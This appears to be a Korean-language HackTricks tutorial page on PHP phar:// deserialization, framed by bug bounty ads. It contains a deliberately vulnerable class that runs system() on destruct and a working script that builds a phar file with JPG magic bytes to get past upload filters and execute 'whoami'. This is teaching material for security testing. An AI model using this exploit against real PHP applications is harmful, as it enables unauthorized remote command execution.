# phar:// deserialization

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 **가입하세요**, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**입니다! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Phar** 파일(PHP Archive) 파일은 **직렬화된 형식**의 메타 데이터를 포함하고 있으므로, 파싱할 때 이 **메타데이터**가 **역직렬화**되고 **PHP** 코드 내에서 **역직렬화** 취약점을 악용할 수 있습니다.

이 특성의 가장 좋은 점은 **file_get_contents(), fopen(), file() 또는 file_exists(), md5_file(), filemtime() 또는 filesize()**와 같이 PHP 코드를 평가하지 않는 PHP 함수를 사용하더라도 이 역직렬화가 발생한다는 것입니다.

따라서, 임의의 파일의 크기를 **`phar://`** 프로토콜을 사용하여 PHP 웹이 가져올 수 있는 상황을 상상해 보세요. 그리고 코드 내에서 다음과 유사한 **클래스**를 찾을 수 있습니다:
```php:vunl.php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
당신은 로드될 때 **이 클래스를 악용하여 임의의 명령**을 실행하는 **phar** 파일을 생성할 수 있습니다.
```php:create_phar.php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
**JPG의 매직 바이트**(`\xff\xd8\xff`)가 phar 파일의 시작 부분에 추가되어 **가능한** 파일 **업로드** **제한**을 **우회**하는 방법에 주목하세요.\
`test.phar` 파일을 다음과 같이 **컴파일**하세요:
```bash
php --define phar.readonly=0 create_phar.php
```
취약한 코드를 악용하여 `whoami` 명령을 실행합니다:
```bash
php vuln.php
```
### References

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **가입하세요** **Intigriti**에, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
